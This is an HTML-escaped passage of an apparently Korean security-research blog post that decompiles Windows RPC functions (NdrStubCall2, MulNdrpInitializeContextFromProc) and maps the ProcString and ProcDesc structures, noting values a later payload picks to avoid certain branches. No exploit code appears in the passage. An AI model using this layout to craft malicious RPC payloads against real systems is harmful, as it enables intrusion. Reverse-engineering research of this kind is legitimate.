  v97 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
  v103 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  ProcNum = pRpcMsg-&amp;gt;ProcNum;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pThis )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    MIDL = pRpcMsg-&amp;gt;RpcInterfaceInformation-&amp;gt;InterpreterInfo;
    MIDL2 = MIDL;
    DispatchTable = MIDL-&amp;gt;DispatchTable;
  }
  MIDL_STUB_DESC = MIDL-&amp;gt;pStubDesc;
  ProcNum2 = ProcNum;
  ProcString = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)&amp;amp;MIDL-&amp;gt;ProcString[MIDL-&amp;gt;FmtStringOffset[ProcNum]];
  MulNdrpInitializeContextFromProc(&lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt;, ProcString, &amp;amp;NdrProcContext, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;span class=&#34;hljs-comment&#34;&gt;//Context Initialize&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &lt;code&gt;NdrStubCall2&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;NDR_PROC_CONTEXT&lt;/code&gt;&amp;#xB97C; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;pRpcMsg&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; ProcNum&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xD504;&amp;#xB85C;&amp;#xC2DC;&amp;#xC800;&amp;#xC758; &amp;#xC815;&amp;#xBCF4;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD55C; ProcString&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xB97C; &amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h4 id=&#34;MulNdrpInitializeContextFromProc&#34;&gt;&lt;a href=&#34;#MulNdrpInitializeContextFromProc&#34; class=&#34;headerlink&#34; title=&#34;MulNdrpInitializeContextFromProc&#34;&gt;&lt;/a&gt;&lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&lt;/h4&gt;&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;MulNdrpInitializeContextFromProc&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; SyntaxType, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *ProcString, NDR_PROC_CONTEXT *pContext, __int64 a4, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; a5)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; retval; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; v10; &lt;span class=&#34;hljs-comment&#34;&gt;// al&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; RpcFlag; &lt;span class=&#34;hljs-comment&#34;&gt;// er9&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v12; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v14; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v15; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v16; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; HandleType; &lt;span class=&#34;hljs-comment&#34;&gt;// dl&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 InterpreterFlags; &lt;span class=&#34;hljs-comment&#34;&gt;// al&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *ProcString1; &lt;span class=&#34;hljs-comment&#34;&gt;// rdi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; StackSize; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  __int64 ProcDesc; &lt;span class=&#34;hljs-comment&#34;&gt;// rdi&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *param; &lt;span class=&#34;hljs-comment&#34;&gt;// r8&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 v24; &lt;span class=&#34;hljs-comment&#34;&gt;// cl&lt;/span&gt;
  __int64 v25; &lt;span class=&#34;hljs-comment&#34;&gt;// rcx&lt;/span&gt;

  retval = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !a5 )                                    &lt;span class=&#34;hljs-comment&#34;&gt;// a5 == 0&lt;/span&gt;
  {                                             &lt;span class=&#34;hljs-comment&#34;&gt;// Init NDR_PROC_CONTEXT&lt;/span&gt;
    memset_0(pContext, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x100&lt;/span&gt;ui64);           &lt;span class=&#34;hljs-comment&#34;&gt;// Size of NDR_PROC_CONTEXT&lt;/span&gt;
    pContext-&amp;gt;AllocateContext.BytesRemaining = &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;i64;&lt;span class=&#34;hljs-comment&#34;&gt;// Size of AllocateContext.PreAllocatedBlock&lt;/span&gt;
    pContext-&amp;gt;AllocateContext.pBlockPointer = (__int64)pContext-&amp;gt;AllocateContext.PreAllocatedBlock;
    pContext-&amp;gt;AllocateContext.MemoryList.Blink = &amp;amp;pContext-&amp;gt;AllocateContext.MemoryList;
    pContext-&amp;gt;AllocateContext.MemoryList.Flink = &amp;amp;pContext-&amp;gt;AllocateContext.MemoryList;
  }
  pContext-&amp;gt;pProcFormat = (__int64)ProcString;
  pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrGetBuffer;
  pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpSendReceive;
  pContext-&amp;gt;StartofStack = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)a4;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( SyntaxType == &lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt; )               &lt;span class=&#34;hljs-comment&#34;&gt;// a1 == 0x8A885D04&lt;/span&gt;
  {
    LODWORD(pContext-&amp;gt;CurrentSyntaxType) = &lt;span class=&#34;hljs-number&#34;&gt;0x8A885D04&lt;/span&gt;;
    HandleType = *ProcString;
    pContext-&amp;gt;HandleType = *ProcString;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( HandleType == &lt;span class=&#34;hljs-number&#34;&gt;0x33&lt;/span&gt; )
    {
      pContext-&amp;gt;Flags |= &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;u;
      pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrNsSendReceive;
      pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrNsSendReceive;
    }
    InterpreterFlags = ProcString[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;];
    ProcString1 = ProcString + &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
    LOBYTE(pContext-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.InterpreterFlags) = InterpreterFlags;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (InterpreterFlags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )          &lt;span class=&#34;hljs-comment&#34;&gt;// HasRpcFlags&lt;/span&gt;
    {
      RpcFlag = *(_DWORD *)ProcString1;
      ProcString1 += &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      RpcFlag = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    }
    retval = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)ProcString1;
    StackSize = *((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)ProcString1 + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    ProcDesc = (__int64)(ProcString1 + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);      &lt;span class=&#34;hljs-comment&#34;&gt;// ProcString+6&lt;/span&gt;
    pContext-&amp;gt;StackSize = StackSize;
    pContext-&amp;gt;pHandleFormatSave = ProcDesc;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !HandleType )
    {
      v25 = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;i64;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *(_BYTE *)ProcDesc != &lt;span class=&#34;hljs-number&#34;&gt;0x32&lt;/span&gt; )
        v25 = &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;i64;
      ProcDesc += v25;
    }
    pContext-&amp;gt;&lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt;.NdrInfo.pProcDesc = ProcDesc;
    param = (&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;);
    v24 = *(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
    pContext-&amp;gt;NumberParams = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v24 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
    {
      pContext-&amp;gt;Flags ^= (pContext-&amp;gt;Flags ^ (*(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;;
      param += (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)*param;
      *(_DWORD *)&amp;amp;pContext-&amp;gt;FloatDoubleMask = *(&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        pContext-&amp;gt;CorrIncrement = &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;;
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (*(_BYTE *)(ProcDesc + &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0x40&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
        pContext-&amp;gt;CorrIncrement = &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;;
    }
    pContext-&amp;gt;Flags &amp;amp;= &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFF8&lt;/span&gt;;
    pContext-&amp;gt;Params = param;
    pContext-&amp;gt;Flags |= (InterpreterFlags &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; | ((v24 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; | (v24 &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2u&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    pContext-&amp;gt;ExceptionFlag = ((&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)~(InterpreterFlags &amp;gt;&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &amp;amp; ((pContext-&amp;gt;Flags &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    ...
  }
  v15 = pContext-&amp;gt;Flags;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v15 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrGetPipeBuffer;
    RpcFlag = RpcFlag &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFEFFF&lt;/span&gt; | &lt;span class=&#34;hljs-number&#34;&gt;0x2000&lt;/span&gt;;
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpPipeSendReceive;
  }
  v16 = v15 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFEF&lt;/span&gt;;
  pContext-&amp;gt;RpcFlgs = RpcFlag;
  pContext-&amp;gt;Flags = v16;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (v16 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = NdrpProxyGetBuffer;
    pContext-&amp;gt;SyntaxDispatch[&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;] = NdrpProxySendReceive;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; retval;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ProcString&amp;#xC758; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC5D0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBA3C;&amp;#xC800; &amp;#xB2E4;&amp;#xC12F; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; 0&amp;#xC774; &amp;#xC804;&amp;#xB2EC;&amp;#xB418;&amp;#xC5C8;&amp;#xC73C;&amp;#xB2C8; &lt;code&gt;pContext&lt;/code&gt;&amp;#xC758; &amp;#xCD08;&amp;#xAE30;&amp;#xD654;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xACE0; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; &lt;code&gt;SyntaxType&lt;/code&gt;&amp;#xC740; &lt;code&gt;0x8A885D04&lt;/code&gt;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; if &amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBCC0;&amp;#xC218; &amp;#xBA85;&amp;#xC740; &amp;#xCC98;&amp;#xC74C;&amp;#xC5D0;&amp;#xB294; &amp;#xC800;&amp;#xB807;&amp;#xAC8C; &amp;#xC608;&amp;#xC058;&amp;#xAC8C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xBCC0;&amp;#xC218;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xAC12;&amp;#xC774; &amp;#xB300;&amp;#xC785;&amp;#xB418;&amp;#xB294; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD544;&amp;#xB4DC;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC744; &amp;#xBCF4;&amp;#xACE0; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC12;&amp;#xC778;&amp;#xC9C0; &amp;#xC720;&amp;#xCD94;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xC81C;&amp;#xAC00; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; ProcString&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ProcString[0]&lt;/code&gt;: &lt;code&gt;HandleType&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC774; &amp;#xAC12;&amp;#xC774; 0&amp;#xC774;&amp;#xAC70;&amp;#xB098; 0x33&amp;#xC774;&amp;#xBA74; &amp;#xB2E4;&amp;#xB978; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xC791;&amp;#xC5C5;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294;&amp;#xB370; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC758;&amp;#xBBF8;&amp;#xB97C; &amp;#xAC16;&amp;#xB294;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB974;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD84;&amp;#xAE30;&amp;#xB97C; &amp;#xD68C;&amp;#xD53C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xD6C4;&amp;#xC220;&amp;#xD560; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ProcString[0]&lt;/code&gt;&amp;#xC740; 0&amp;#xC774;&amp;#xB098; 0x33&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[1]&lt;/code&gt;: &lt;code&gt;InterpreterFlags&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC774; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC758; 4&amp;#xBC88;&amp;#xC9F8; &amp;#xBE44;&amp;#xD2B8;&amp;#xAC00; 1&amp;#xC774;&amp;#xBA74; &lt;code&gt;ProcString&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;RpcFlag&lt;/code&gt;&amp;#xAC00; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC758;&amp;#xBBF8;&amp;#xD55C;&amp;#xB2E4;. &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xC791;&amp;#xC5C5;&amp;#xC744; &amp;#xD68C;&amp;#xD53C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC774; &amp;#xB610;&amp;#xD55C; 8&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xD588;&amp;#xB2E4;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[2~3]&lt;/code&gt;&amp;#xC758; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;: &lt;code&gt;MulNdrpInitializeContextFromProc&lt;/code&gt;&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xD560; &amp;#xAC12;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString[4~5]&lt;/code&gt;&amp;#xC758; 2&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;: &lt;code&gt;StackSize&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&amp;#xC5B4;&amp;#xB5A4; Stack&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xC778;&amp;#xC9C0;&amp;#xB294; &amp;#xD6C4;&amp;#xC220; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcString+6 ~&lt;/code&gt;: &lt;code&gt;ProcDesc&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pContext-&amp;gt;NdrInfo.pProcDesc&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xC785;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &lt;code&gt;ProcDesc&lt;/code&gt;&amp;#xB77C;&amp;#xACE0; &amp;#xC720;&amp;#xCD94; &amp;#xAC00;&amp;#xB2A5;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC73C;&amp;#xB85C;&amp;#xB294; &lt;code&gt;HandleType&lt;/code&gt;&amp;#xC774; 0&amp;#xC774;&amp;#xB098; 0x33&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xACE0; &lt;code&gt;InterpreterFlags&lt;/code&gt;&amp;#xC758; &lt;code&gt;HasRpcFlags&lt;/code&gt;&amp;#xAC00; False&amp;#xC77C; &amp;#xB54C; &lt;code&gt;ProcString+6&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;ProcDesc&lt;/code&gt;&amp;#xC758; &amp;#xAD6C;&amp;#xC870;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ProcDesc[4]&lt;/code&gt;: Flags&lt;ul&gt;
&lt;li&gt;&amp;#xD6C4;&amp;#xC220;&amp;#xD560; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xBC18;&amp;#xD658; &amp;#xC9C1;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC774; &amp;#xD50C;&amp;#xB798;&amp;#xADF8;&amp;#xC758; 3&amp;#xBC88;&amp;#xC9F8; &amp;#xBE44;&amp;#xD2B8;&amp;#xAC00; 1&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD574;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBC18;&amp;#xD658;&amp;#xAC12; &amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xAC70;&amp;#xB098; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;&amp;#xB2E4;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcDesc[5]&lt;/code&gt;: Params&amp;#xC758; &amp;#xC218;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;NdrpServerUnMashal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xB97C; &amp;#xD30C;&amp;#xC2F1;&amp;#xD560; &amp;#xB54C; &amp;#xCC38;&amp;#xC870;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ProcDesc + 6 ~&lt;/code&gt;: Params&lt;ul&gt;
&lt;li&gt;&amp;#xD6C4;&amp;#xC220;&amp;#xD560; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB420; &amp;#xAC01; &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xC758; &amp;#xC2A4;&amp;#xD0DD; &amp;#xC0C1;&amp;#xC758; &amp;#xC704;&amp;#xCE58; &amp;#xAE38;&amp;#xC774; &amp;#xB4F1;&amp;#xC744; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NDR_PROC_CONTEXT-&amp;gt;Params&lt;/code&gt;&amp;#xAC00; &amp;#xC774; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0B4;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
